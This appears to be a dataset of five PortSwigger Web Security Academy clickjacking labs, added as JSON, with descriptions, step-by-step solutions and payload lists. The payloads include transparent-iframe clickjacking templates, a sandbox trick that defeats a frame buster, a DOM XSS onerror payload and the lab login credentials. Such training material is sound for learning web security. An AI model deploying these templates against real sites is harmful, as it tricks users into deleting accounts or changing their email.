@@ -1,0 +1,113 @@
+[
+  {
+    "url": "https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected",
+    "category": "clickjacking",
+    "title": "Basic clickjacking with CSRF token protection",
+    "description": "This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word \"click\" on a decoy website.",
+    "solution_steps": [
+      "Log in to your account on the target website.",
+      "Go to the exploit server and paste the following HTML template into the Body section: <style>\n    iframe {\n        position:relative;\n        width:$width_value;\n        height: $height_value;\n        opacity: $opacity;\n        z-index: 2;\n    }\n    div {\n        position:absolute;\n        top:$top_value;\n        left:$side_value;\n        z-index: 1;\n    }\n</style>\n<div>Test me</div>\n<iframe src=\"YOUR-LAB-ID.web-security-academy.net/my-account\"></iframe>",
+      "Make the following adjustments to the template: Replace YOUR-LAB-ID in the iframe src attribute with your unique lab ID. Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively). Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the \"Delete account\" button and the \"Test me\" decoy action align (we suggest 300px and 60px respectively). Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.",
+      "Click Store and then View exploit .",
+      "Hover over Test me and ensure the cursor changes to a hand indicating that the div element is positioned correctly. Do not actually click the \"Delete account\" button yourself. If you do, the lab will be broken and you will need to wait until it resets to try again (about 20 minutes). If the div does not line up properly, adjust the top and left properties of the style sheet.",
+      "Once you have the div element lined up correctly, change \"Test me\" to \"Click me\" and click Store .",
+      "Click on Deliver exploit to victim and the lab should be solved."
+    ],
+    "solution": "1. Log in to your account on the target website.\n2. Go to the exploit server and paste the following HTML template into the Body section: <style>\n    iframe {\n        position:relative;\n        width:$width_value;\n        height: $height_value;\n        opacity: $opacity;\n        z-index: 2;\n    }\n    div {\n        position:absolute;\n        top:$top_value;\n        left:$side_value;\n        z-index: 1;\n    }\n</style>\n<div>Test me</div>\n<iframe src=\"YOUR-LAB-ID.web-security-academy.net/my-account\"></iframe>\n3. Make the following adjustments to the template: Replace YOUR-LAB-ID in the iframe src attribute with your unique lab ID. Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively). Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the \"Delete account\" button and the \"Test me\" decoy action align (we suggest 300px and 60px respectively). Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.\n4. Click Store and then View exploit .\n5. Hover over Test me and ensure the cursor changes to a hand indicating that the div element is positioned correctly. Do not actually click the \"Delete account\" button yourself. If you do, the lab will be broken and you will need to wait until it resets to try again (about 20 minutes). If the div does not line up properly, adjust the top and left properties of the style sheet.\n6. Once you have the div element lined up correctly, change \"Test me\" to \"Click me\" and click Store .\n7. Click on Deliver exploit to victim and the lab should be solved.",
+    "payloads": [
+      "wiener:peter",
+      "<style>\n    iframe {\n        position:relative;\n        width:$width_value;\n        height: $height_value;\n        opacity: $opacity;\n        z-index: 2;\n    }\n    div {\n        position:absolute;\n        top:$top_value;\n        left:$side_value;\n        z-index: 1;\n    }\n</style>\n<div>Test me</div>\n<iframe src=\"YOUR-LAB-ID.web-security-academy.net/my-account\"></iframe>",
+      "YOUR-LAB-ID",
+      "$height_value",
+      "$width_value",
+      "$top_value",
+      "$side_value",
+      "$opacity",
+      "left"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss",
+    "category": "clickjacking",
+    "title": "Exploiting clickjacking vulnerability to trigger DOM-based XSS",
+    "description": "This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the \"Click me\" button to call theprint()function.",
+    "solution_steps": [
+      "Go to the exploit server and paste the following HTML template into the Body section: <style>\n\tiframe {\n\t\tposition:relative;\n\t\twidth:$width_value;\n\t\theight: $height_value;\n\t\topacity: $opacity;\n\t\tz-index: 2;\n\t}\n\tdiv {\n\t\tposition:absolute;\n\t\ttop:$top_value;\n\t\tleft:$side_value;\n\t\tz-index: 1;\n\t}\n</style>\n<div>Test me</div>\n<iframe\nsrc=\"YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult\"></iframe>",
+      "Make the following adjustments to the template: Replace YOUR-LAB-ID in the iframe src attribute with your unique lab ID so that the URL points to the target website's \"Submit feedback\" page. Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively). Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the \"Submit feedback\" button and the \"Test me\" decoy action align (we suggest 610px and 80px respectively). Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.",
+      "Click Store and then View exploit .",
+      "Hover over \"Test me\" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties of the style sheet.",
+      "Click Test me . The print dialog should open.",
+      "Change \"Test me\" to \"Click me\" and click Store on the exploit server.",
+      "Now click on Deliver exploit to victim and the lab should be solved."
+    ],
+    "solution": "1. Go to the exploit server and paste the following HTML template into the Body section: <style>\n\tiframe {\n\t\tposition:relative;\n\t\twidth:$width_value;\n\t\theight: $height_value;\n\t\topacity: $opacity;\n\t\tz-index: 2;\n\t}\n\tdiv {\n\t\tposition:absolute;\n\t\ttop:$top_value;\n\t\tleft:$side_value;\n\t\tz-index: 1;\n\t}\n</style>\n<div>Test me</div>\n<iframe\nsrc=\"YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult\"></iframe>\n2. Make the following adjustments to the template: Replace YOUR-LAB-ID in the iframe src attribute with your unique lab ID so that the URL points to the target website's \"Submit feedback\" page. Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively). Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the \"Submit feedback\" button and the \"Test me\" decoy action align (we suggest 610px and 80px respectively). Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.\n3. Click Store and then View exploit .\n4. Hover over \"Test me\" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties of the style sheet.\n5. Click Test me . The print dialog should open.\n6. Change \"Test me\" to \"Click me\" and click Store on the exploit server.\n7. Now click on Deliver exploit to victim and the lab should be solved.",
+    "payloads": [
+      "print()",
+      "<style>\n\tiframe {\n\t\tposition:relative;\n\t\twidth:$width_value;\n\t\theight: $height_value;\n\t\topacity: $opacity;\n\t\tz-index: 2;\n\t}\n\tdiv {\n\t\tposition:absolute;\n\t\ttop:$top_value;\n\t\tleft:$side_value;\n\t\tz-index: 1;\n\t}\n</style>\n<div>Test me</div>\n<iframe\nsrc=\"YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult\"></iframe>",
+      "YOUR-LAB-ID",
+      "$opacity"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/clickjacking/lab-frame-buster-script",
+    "category": "clickjacking",
+    "title": "Clickjacking with a frame buster script",
+    "description": "This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?",
+    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.",
+    "payloads": [
+      "wiener:peter",
+      "<style>\n    iframe {\n        position:relative;\n        width:$width_value;\n        height: $height_value;\n        opacity: $opacity;\n        z-index: 2;\n    }\n    div {\n        position:absolute;\n        top:$top_value;\n        left:$side_value;\n        z-index: 1;\n    }\n</style>\n<div>Test me</div>\n<iframe sandbox=\"allow-forms\"\nsrc=\"YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com\"></iframe>",
+      "YOUR-LAB-ID",
+      "$opacity",
+      "sandbox=\"allow-forms\""
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/clickjacking/lab-multistep",
+    "category": "clickjacking",
+    "title": "Multistep clickjacking",
+    "description": "This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on \"Click me first\" and \"Click me next\" decoy actions. You will need to use two elements for this lab.",
+    "solution_steps": [
+      "Log in to your account on the target website and go to the user account page.",
+      "Go to the exploit server and paste the following HTML template into the \"Body\" section: <style>\n\tiframe {\n\t\tposition:relative;\n\t\twidth:$width_value;\n\t\theight: $height_value;\n\t\topacity: $opacity;\n\t\tz-index: 2;\n\t}\n\u00a0 \u00a0.firstClick, .secondClick {\n\t\tposition:absolute;\n\t\ttop:$top_value1;\n\t\tleft:$side_value1;\n\t\tz-index: 1;\n\t}\n\u00a0 \u00a0.secondClick {\n\t\ttop:$top_value2;\n\t\tleft:$side_value2;\n\t}\n</style>\n<div class=\"firstClick\">Test me first</div>\n<div class=\"secondClick\">Test me next</div>\n<iframe src=\"YOUR-LAB-ID.web-security-academy.net/my-account\"></iframe>",
+      "Make the following adjustments to the template: Replace YOUR-LAB-ID with your unique lab ID so that URL points to the target website's user account page. Substitute suitable pixel values for the $width_value and $height_value variables of the iframe (we suggest 500px and 700px respectively). Substitute suitable pixel values for the $top_value1 and $side_value1 variables of the decoy web content so that the \"Delete account\" button and the \"Test me first\" decoy action align (we suggest 330px and 50px respectively). Substitute a suitable value for the $top_value2 and $side_value2 variables so that the \"Test me next\" decoy action aligns with the \"Yes\" button on the confirmation page (we suggest 285px and 225px respectively). Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.",
+      "Click Store and then View exploit .",
+      "Hover over \"Test me first\" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties inside the firstClick class of the style sheet.",
+      "Click Test me first then hover over Test me next and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties inside the secondClick class of the style sheet.",
+      "Once you have the div element lined up correctly, change \"Test me first\" to \"Click me first\", \"Test me next\" to \"Click me next\" and click Store on the exploit server.",
+      "Now click on Deliver exploit to victim and the lab should be solved."
+    ],
+    "solution": "1. Log in to your account on the target website and go to the user account page.\n2. Go to the exploit server and paste the following HTML template into the \"Body\" section: <style>\n\tiframe {\n\t\tposition:relative;\n\t\twidth:$width_value;\n\t\theight: $height_value;\n\t\topacity: $opacity;\n\t\tz-index: 2;\n\t}\n\u00a0 \u00a0.firstClick, .secondClick {\n\t\tposition:absolute;\n\t\ttop:$top_value1;\n\t\tleft:$side_value1;\n\t\tz-index: 1;\n\t}\n\u00a0 \u00a0.secondClick {\n\t\ttop:$top_value2;\n\t\tleft:$side_value2;\n\t}\n</style>\n<div class=\"firstClick\">Test me first</div>\n<div class=\"secondClick\">Test me next</div>\n<iframe src=\"YOUR-LAB-ID.web-security-academy.net/my-account\"></iframe>\n3. Make the following adjustments to the template: Replace YOUR-LAB-ID with your unique lab ID so that URL points to the target website's user account page. Substitute suitable pixel values for the $width_value and $height_value variables of the iframe (we suggest 500px and 700px respectively). Substitute suitable pixel values for the $top_value1 and $side_value1 variables of the decoy web content so that the \"Delete account\" button and the \"Test me first\" decoy action align (we suggest 330px and 50px respectively). Substitute a suitable value for the $top_value2 and $side_value2 variables so that the \"Test me next\" decoy action aligns with the \"Yes\" button on the confirmation page (we suggest 285px and 225px respectively). Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.\n4. Click Store and then View exploit .\n5. Hover over \"Test me first\" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties inside the firstClick class of the style sheet.\n6. Click Test me first then hover over Test me next and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties inside the secondClick class of the style sheet.\n7. Once you have the div element lined up correctly, change \"Test me first\" to \"Click me first\", \"Test me next\" to \"Click me next\" and click Store on the exploit server.\n8. Now click on Deliver exploit to victim and the lab should be solved.",
+    "payloads": [
+      "wiener:peter",
+      "<style>\n\tiframe {\n\t\tposition:relative;\n\t\twidth:$width_value;\n\t\theight: $height_value;\n\t\topacity: $opacity;\n\t\tz-index: 2;\n\t}\n\u00a0 \u00a0.firstClick, .secondClick {\n\t\tposition:absolute;\n\t\ttop:$top_value1;\n\t\tleft:$side_value1;\n\t\tz-index: 1;\n\t}\n\u00a0 \u00a0.secondClick {\n\t\ttop:$top_value2;\n\t\tleft:$side_value2;\n\t}\n</style>\n<div class=\"firstClick\">Test me first</div>\n<div class=\"secondClick\">Test me next</div>\n<iframe src=\"YOUR-LAB-ID.web-security-academy.net/my-account\"></iframe>",
+      "YOUR-LAB-ID",
+      "$width_value",
+      "$height_value",
+      "$top_value1",
+      "$side_value1",
+      "$top_value2",
+      "$side_value2",
+      "$opacity",
+      "firstClick",
+      "secondClick"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input",
+    "category": "clickjacking",
+    "title": "Clickjacking with form input data prefilled from a URL parameter",
+    "description": "This lab extends the basic clickjacking example inLab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an \"Update email\" button.",
+    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.",
+    "payloads": [
+      "wiener:peter",
+      "<style>\n    iframe {\n        position:relative;\n        width:$width_value;\n        height: $height_value;\n        opacity: $opacity;\n        z-index: 2;\n    }\n    div {\n        position:absolute;\n        top:$top_value;\n        left:$side_value;\n        z-index: 1;\n    }\n</style>\n<div>Test me</div>\n<iframe src=\"YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com\"></iframe>",
+      "YOUR-LAB-ID",
+      "$height_value",
+      "$width_value",
+      "$top_value",
+      "$side_value",
+      "$opacity"
+    ]
+  }
+]
